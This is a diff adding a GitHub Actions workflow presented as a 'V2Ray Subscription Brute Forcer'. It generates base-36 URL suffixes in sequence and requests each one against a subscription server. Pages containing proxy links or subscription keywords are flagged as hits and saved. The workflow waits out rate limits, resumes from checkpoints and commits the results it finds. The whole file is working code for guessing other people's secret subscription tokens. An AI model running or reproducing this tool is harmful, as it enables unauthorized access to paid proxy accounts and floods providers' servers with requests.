@@ -1,0 +1,671 @@
+name: V2Ray Subscription Brute Forcer
+
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: "Choose brute-force mode"
+        required: true
+        default: "test"
+        type: choice
+        options:
+          - Test Mode
+          - Random Mode
+          - Sequential Mode
+
+      full_url:
+        description: "Full subcription URL for Test Mode"
+        required: false
+        default: ""
+        type: string
+
+      base_url:
+        description: "Main Base URL"
+        required: false
+        type: string
+
+      charcount:
+        description: "Total suffix characters count to solve"
+        required: false
+        default: "32"
+        type: string
+
+      known_prefix:
+        description: "Known prefix for Random/Sequential Mode"
+        required: false
+        default: ""
+        type: string
+
+      sequential_direction:
+        description: "Which digit position should change fastest in Sequential Mode"
+        required: true
+        default: "Last digit first"
+        type: choice
+        options:
+          - First digit first
+          - Last digit first
+
+      generated_position:
+        description: "Where to place the generated characters"
+        required: true
+        default: "Back of known prefix"
+        type: choice
+        options:
+          - Front of known prefix
+          - Back of known prefix
+
+      delay_ms:
+        description: 'Delay between requests in milliseconds (0 = no delay)'
+        required: true
+        default: '500'
+
+      stop_on_hit:
+        description: "Stop when a valid result is found"
+        required: true
+        default: "Yes"
+        type: choice
+        options:
+          - true
+          - false
+          
+permissions:
+  contents: write
+
+jobs:
+  Fetching:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+   
+      - name: Create URL Checker Shell
+        shell: powershell
+        run: |
+          @'
+          param(
+              [string]$Uri,
+              [int]$Timeout = 2
+          )
+
+          $ErrorActionPreference = "Stop"
+
+          try {
+              $r = Invoke-WebRequest `
+                  -Uri $Uri `
+                  -UseBasicParsing `
+                  -TimeoutSec $Timeout `
+                  -UserAgent "Mozilla/5.0"
+
+              $c = $r.Content
+              $s = $c.Length
+
+              Write-Host "[RESPOND] HTTP $($r.StatusCode)  Size: $s"
+
+              $ok = $false
+
+              # ------------------------------------------------
+              # 1. Direct V2Ray / proxy subscription content
+              # ------------------------------------------------
+              if ($c -match "vless://|vmess://|trojan://|ss://|hysteria2?://|tuic://|anytls://|socks://") {
+                  $ok = $true
+              }
+
+              # ------------------------------------------------
+              # 2. Base64 encoded subscription
+              # ------------------------------------------------
+              elseif ($s -gt 1500 -and $c -match "^[A-Za-z0-9+/=`r`n]+$") {
+                  $ok = $true
+              }
+
+              # ------------------------------------------------
+              # 3. Subscription URL contained in response
+              # ------------------------------------------------
+              elseif (
+                  $c -match 'https?://[^"''<>\s]+/(?:api|sub|subscribe|subscription)/[^"''<>\s]+'
+              ) {
+                  $ok = $true
+              }
+
+              # ------------------------------------------------
+              # 4. Common subscription-page keywords
+              # ------------------------------------------------
+              elseif (
+                  $c -match "subscription" -or
+                  $c -match "subscribe" -or
+                  $c -match "traffic" -or
+                  $c -match "expire" -or
+                  $c -match "device"
+              ) {
+                  $ok = $true
+              }
+
+              # ------------------------------------------------
+              # Result
+              # ------------------------------------------------
+              if ($ok) {
+                  Write-Host "[VALID] Subscription detected."
+                  exit 0
+              }
+              else {
+                  Write-Host "[INVALID] Not a valid subscription response."
+                  exit 1
+              }
+          }
+          catch {
+              if (
+                  $_.Exception.Response -and
+                  [int]$_.Exception.Response.StatusCode -eq 429
+              ) {
+                  Write-Host "[RATE LIMITED]"
+                  exit 2
+              }
+
+              if ($_.Exception.Response) {
+                  $status = [int]$_.Exception.Response.StatusCode
+                  Write-Host "[ERROR] HTTP $status - $($_.Exception.Message)"
+              }
+              else {
+                  Write-Host "[ERROR] $($_.Exception.Message)"
+              }
+
+              exit 1
+          }
+          '@ | Set-Content -Path "$env:RUNNER_TEMP\v2ray_check.ps1" -Encoding UTF8
+
+      - name: Checking Inputs
+        run: |
+          Write-Host "V2Ray Subscription Brute Forcer"
+          Write-Host "Mode: ${{ inputs.mode }}"
+          Write-Host "Base URL: ${{ inputs.base_url }}"
+          Write-Host "Suffix length: ${{ inputs.charcount }}"
+          Write-Host "Known prefix: ${{ inputs.known_prefix }}"
+
+      - name: Test Mode
+        if: ${{ inputs.mode == 'Test Mode' }}
+        shell: powershell
+        run: |
+          $full = "${{ inputs.full_url }}"
+
+          if ([string]::IsNullOrWhiteSpace($full)) {
+              Write-Host "[ERROR] No URL was entered."
+              exit 1
+          }
+
+          $fullUrl = $full
+
+          Write-Host ""
+          Write-Host "============================================"
+          Write-Host "[TEST] Trying: $fullUrl"
+          Write-Host "============================================"
+          Write-Host ""
+
+          & "$env:RUNNER_TEMP\v2ray_check.ps1" -Uri $fullUrl -Timeout 3 > $null 2>&1
+
+      - name: Sequential Checking
+        if: ${{ inputs.mode == 'Sequential Mode' }}
+        shell: powershell
+        run: |
+          $charCount = [int]"${{ inputs.charcount }}"
+          $knownPrefix = "${{ inputs.known_prefix }}"
+          $chars = "0123456789abcdefghijklmnopqrstuvwxyz"
+          $baseN = 36
+
+          $prefixLen = $knownPrefix.Length
+          $genLen = $charCount - $prefixLen
+
+          if ($genLen -lt 1) {
+              Write-Host "[ERROR] Known prefix is more than or equal to total suffix count."
+              exit 1
+          }
+
+          Write-Host "Total suffix count : $charCount"
+          Write-Host "Known prefix count : $prefixLen"
+          Write-Host "Characters to generate : $genLen"
+          Write-Host ""
+
+      - name: Compare Inputs And Last Runner States
+        if: ${{ inputs.mode == 'Sequential Mode' }}
+        shell: powershell
+        run: |
+          $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
+
+          $currentBase = "${{ inputs.base_url }}"
+          $currentPrefix = "${{ inputs.known_prefix }}"
+          $currentCharCount = "${{ inputs.charcount }}"
+
+          $lastCheckpoint = ""
+
+          if (Test-Path $stateFile) {
+
+              $savedBase = ""
+              $savedPrefix = ""
+              $savedCharCount = ""
+              $savedCheckpoint = ""
+
+              foreach ($line in Get-Content $stateFile) {
+
+              # Remove whitespace and invisible Unicode characters at the beginning
+              $line = $line.Trim()
+              $line = $line -replace '^[\uFEFF\u200B\u200C\u200D]+', ''
+          
+              if ($line.StartsWith("BASE_URL=")) {
+                  $savedBase = $line.Substring("BASE_URL=".Length).Trim()
+              }
+              elseif ($line.StartsWith("SUFFIX_LENGTH=")) {
+                  $savedCharCount = $line.Substring("SUFFIX_LENGTH=".Length).Trim()
+              }
+              elseif ($line.StartsWith("KNOWN_PREFIX=")) {
+                  $savedPrefix = $line.Substring("KNOWN_PREFIX=".Length).Trim()
+              }
+              elseif ($line.StartsWith("LAST_CHECKPOINT=")) {
+                  $savedCheckpoint = $line.Substring("LAST_CHECKPOINT=".Length).Trim()
+              }
+          }
+
+              $inputsMatch = (
+                  ($savedBase -eq $currentBase) -and
+                  ($savedPrefix -eq $currentPrefix) -and
+                  ($savedCharCount -eq $currentCharCount) -and
+                  (-not [string]::IsNullOrWhiteSpace($savedCheckpoint))
+              )
+
+              if ($inputsMatch) {
+
+                  $lastCheckpoint = $savedCheckpoint
+
+                  Write-Host ""
+                  Write-Host "========== CHECKED LISTS =========="
+                  Write-Host "Base URL       : Matches"
+                  Write-Host "Suffix length  : Matches"
+                  Write-Host "Known prefix   : Matches"
+                  Write-Host "Last checkpoint: $lastCheckpoint"
+                  Write-Host "Action         : START FROM LAST CHECKPOINT"
+                  Write-Host "====================================="
+                  Write-Host ""
+
+              }
+              else {
+
+                  Write-Host ""
+                  Write-Host "========== CHECKED LISTS =========="
+                  
+                  if ($savedBase -eq $currentBase) {
+                      Write-Host "Base URL       : Matches"
+                  }
+                  else {
+                      Write-Host "Base URL       : Not Matches"
+                  }
+
+                  if ($savedCharCount -eq $currentCharCount) {
+                      Write-Host "Suffix length  : Matches"
+                  }
+                  else {
+                      Write-Host "Suffix length  : Not Matches"
+                  }
+
+                  if ($savedPrefix -eq $currentPrefix) {
+                      Write-Host "Known prefix   : Matches"
+                  }
+                  else {
+                      Write-Host "Known prefix   : Not Matches"
+                  }
+
+                  if ([string]::IsNullOrWhiteSpace($savedCheckpoint)) {
+                      Write-Host "Last checkpoint: NONE"
+                  }
+                  else {
+                      Write-Host "Last checkpoint: $savedCheckpoint"
+                  }
+
+                  Write-Host "Action         : START FROM BEGINNING"
+                  Write-Host "====================================="
+                  Write-Host ""
+              }
+
+          }
+          else {
+
+              Write-Host ""
+              Write-Host "========== CHECKED LISTS =========="
+              Write-Host "No previous state file found."
+              Write-Host "Action         : START FROM BEGINNING"
+              Write-Host "====================================="
+              Write-Host ""
+          }
+
+          # Export values for later workflow steps
+          "CHECKPOINT_BASE=$currentBase" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "CHECKPOINT_PREFIX=$currentPrefix" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "CHECKPOINT_LENGTH=$currentCharCount" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+          "CHECKPOINT_LAST=$lastCheckpoint" | Out-File `
+              -FilePath $env:GITHUB_ENV `
+              -Encoding utf8 -Append
+
+      - name: Sequential Generating
+        if: ${{ inputs.mode == 'Sequential Mode' }}
+        shell: powershell
+        run: |
+          $charCount = [int]"${{ inputs.charcount }}"
+          $delayMs = [int]"${{ inputs.delay_ms }}"
+          $knownPrefix = "${{ inputs.known_prefix }}"
+          $direction = "${{ inputs.sequential_direction }}"
+          $generatedPosition = "${{ inputs.generated_position }}"
+          $base = "${{ inputs.base_url }}"
+          $resultFile = "$env:GITHUB_WORKSPACE\found_subs.txt"
+          $stateFile = "$env:GITHUB_WORKSPACE\last_runner_states.txt"
+          $chars = "0123456789abcdefghijklmnopqrstuvwxyz"
+          $baseN = 36
+          $stopOnHit = "${{ inputs.stop_on_hit }}"
+
+          # ------------------------------------------------------------
+          # Clean existing result file
+          # ------------------------------------------------------------
+
+          if (Test-Path $resultFile) {
+              $uniqueResults = Get-Content -Path $resultFile |
+                  Where-Object { $_.Trim() -ne "" } |
+                  Select-Object -Unique
+
+              Set-Content -Path $resultFile -Value $uniqueResults
+          }
+
+          Write-Host "[STATUS] Stop on result hit: '$stopOnHit'"
+          Write-Host "[STATUS] Sequential direction: '$direction'"
+          Write-Host "[STATUS] Starting sequential checking..."
+
+          # ------------------------------------------------------------
+          # Calculate generated length
+          # ------------------------------------------------------------
+
+          $prefixLen = $knownPrefix.Length
+          $genLen = $charCount - $prefixLen
+
+          if ($genLen -lt 1) {
+              Write-Host "[ERROR] Known prefix is longer than or equal to total characters."
+              exit 1
+          }
+
+          # ------------------------------------------------------------
+          # Resume from previous checkpoint
+          # ------------------------------------------------------------
+
+          $seq = 0
+          $lastCheckpoint = $env:CHECKPOINT_LAST
+
+          if (-not [string]::IsNullOrWhiteSpace($lastCheckpoint)) {
+
+              $generatedPart = $lastCheckpoint
+
+              if ($generatedPosition -eq "Front of known prefix") {
+              
+                  if ($knownPrefix -and $lastCheckpoint.EndsWith($knownPrefix)) {
+                      $generatedPart = $lastCheckpoint.Substring(
+                          0,
+                          $lastCheckpoint.Length - $knownPrefix.Length
+                      )
+                  }
+                  else {
+                      Write-Host "[RESUME] Checkpoint does not match the current known prefix."
+                      Write-Host "[RESUME] Starting from 0."
+                      $lastCheckpoint = ""
+                  }
+              
+              }
+              else {
+              
+                  if ($knownPrefix -and $lastCheckpoint.StartsWith($knownPrefix)) {
+                      $generatedPart = $lastCheckpoint.Substring($knownPrefix.Length)
+                  }
+                  else {
+                      Write-Host "[RESUME] Checkpoint does not match the current known prefix."
+                      Write-Host "[RESUME] Starting from 0."
+                      $lastCheckpoint = ""
+                  }
+              }
+              if ($generatedPart.Length -ne $genLen) {
+                  Write-Host "[RESUME] Checkpoint length does not match current generated length."
+                  Write-Host "[RESUME] Starting from 0."
+                  $seq = 0
+              }
+              else {
+
+                  # ------------------------------------------------------
+                  # Convert checkpoint back to sequence number.
+                  #
+                  # Last digit first:
+                  #   000
+                  #   001
+                  #   002
+                  #
+                  # First digit first:
+                  #   000
+                  #   100
+                  #   200
+                  # ------------------------------------------------------
+
+                  $value = 0
+
+                  if ($direction -eq "Last digit first") {
+
+                      # Normal base-36 representation
+                      foreach ($ch in $generatedPart.ToCharArray()) {
+
+                          $idx = $chars.IndexOf($ch)
+
+                          if ($idx -lt 0) {
+                              Write-Host "[ERROR] Invalid character '$ch' in checkpoint."
+                              exit 1
+                          }
+
+                          $value = ($value * $baseN) + $idx
+                      }
+                  }
+                  else {
+
+                      # First digit changes fastest.
+                      # Reverse the positions when converting back.
+                      for ($i = $genLen - 1; $i -ge 0; $i--) {
+
+                          $ch = $generatedPart[$i]
+
+                          $idx = $chars.IndexOf($ch)
+
+                          if ($idx -lt 0) {
+                              Write-Host "[ERROR] Invalid character '$ch' in checkpoint."
+                              exit 1
+                          }
+
+                          $value = ($value * $baseN) + $idx
+                      }
+                  }
+
+                  $seq = $value + 1
+
+                  Write-Host "[RESUME] Previous checkpoint: $lastCheckpoint"
+                  Write-Host "[RESUME] Starting from sequence: $seq"
+              }
+          }
+          else {
+              Write-Host "[RESUME] No previous checkpoint."
+              Write-Host "[RESUME] Starting from sequence 0."
+          }
+
+          # ------------------------------------------------------------
+          # Sequential checking loop
+          # ------------------------------------------------------------
+
+          for ($test = 1; ; $test++) {
+
+              $n = $seq
+
+              # Create generated part
+              $partChars = New-Object char[] $genLen
+
+              for ($i = 0; $i -lt $genLen; $i++) {
+
+                  $r = $n % $baseN
+                  $n = [math]::Floor($n / $baseN)
+
+                  if ($direction -eq "Last digit first") {
+
+                      # Last digit changes fastest
+                      $position = $genLen - 1 - $i
+
+                  }
+                  else {
+
+                      # First digit changes fastest
+                      $position = $i
+                  }
+
+                  $partChars[$position] = $chars[$r]
+              }
+
+              $part = -join $partChars
+
+              if ($generatedPosition -eq "Front of known prefix") {
+                  $suffix = $part + $knownPrefix
+              }
+              else {
+                  $suffix = $knownPrefix + $part
+              }
+              
+              $fullUrl = $base + $suffix
+
+              # --------------------------------------------------------
+              # Check URL
+              # --------------------------------------------------------
+              $checkOutput = & "$env:RUNNER_TEMP\v2ray_check.ps1" -Uri $fullUrl -Timeout 3 2>&1
+              $checkResult = $LASTEXITCODE
+
+              # --------------------------------------------------------
+              # Delay
+              # --------------------------------------------------------
+
+              if ($delayMs -gt 0) {
+                  Start-Sleep -Milliseconds $delayMs
+              }
+
+              # --------------------------------------------------------
+              # Valid subscription found
+              # --------------------------------------------------------
+
+              if ($checkResult -eq 0) {
+
+                  Write-Host "[FOUND] $fullUrl"
+
+                  $existingResults = @()
+
+                  if (Test-Path $resultFile) {
+                      $existingResults = Get-Content -Path $resultFile
+                  }
+
+                  if ($existingResults -contains $fullUrl) {
+
+                      Write-Host "[DUPLICATE] Result already exists."
+
+                  }
+                  else {
+
+                      Add-Content -Path $resultFile -Value $fullUrl
+                      Write-Host "[SAVED] New result added."
+                  }
+
+                  # ----------------------------------------------------
+                  # Save latest checkpoint
+                  # ----------------------------------------------------
+
+                  $stateContent = @"
+          BASE_URL=$base
+          SUFFIX_LENGTH=$charCount
+          KNOWN_PREFIX=$knownPrefix
+          LAST_CHECKPOINT=$suffix
+          "@
+
+                  [System.IO.File]::WriteAllText(
+                      $stateFile,
+                      $stateContent,
+                      [System.Text.UTF8Encoding]::new($false)
+                  )
+
+                  if ($stopOnHit -eq "true") {
+                      Write-Host "[STOP] Result found. Stopping Sequential Mode."
+                      break
+                  }
+              }
+
+              # --------------------------------------------------------
+              # HTTP 429
+              # --------------------------------------------------------
+
+              elseif ($checkResult -eq 2) {
+
+                  Write-Host "[TOO MANY REQUESTS] Waiting 10 seconds to cool down..."
+
+                  Start-Sleep -Seconds 10
+
+                  # Do NOT increment $seq.
+                  # The same URL will be tested again.
+                  continue
+              }
+
+              # --------------------------------------------------------
+              # Not found / other error
+              # --------------------------------------------------------
+
+              else {
+
+                  Write-Host "[NOT FOUND] $suffix"
+              }
+
+              # --------------------------------------------------------
+              # ALWAYS save latest checkpoint
+              #
+              # This means the repository state can be updated even
+              # when no valid subscription was found.
+              # --------------------------------------------------------
+
+              $stateContent = @"
+          BASE_URL=$base
+          SUFFIX_LENGTH=$charCount
+          KNOWN_PREFIX=$knownPrefix
+          LAST_CHECKPOINT=$suffix
+          "@
+
+              [System.IO.File]::WriteAllText(
+                  $stateFile,
+                  $stateContent,
+                  [System.Text.UTF8Encoding]::new($false)
+              )
+
+              # --------------------------------------------------------
+              # Move to next sequence
+              # --------------------------------------------------------
+
+              $global:LASTEXITCODE = 0
+              $seq++
+          }
+
+      - name: Update Results And Last Checkpoint
+        if: always()
+        shell: bash
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+
+          git add found_subs.txt last_runner_states.txt
+
+          if ! git diff --cached --quiet; then
+            git commit -m "Update brute forcer state"
+            git push
+          fi
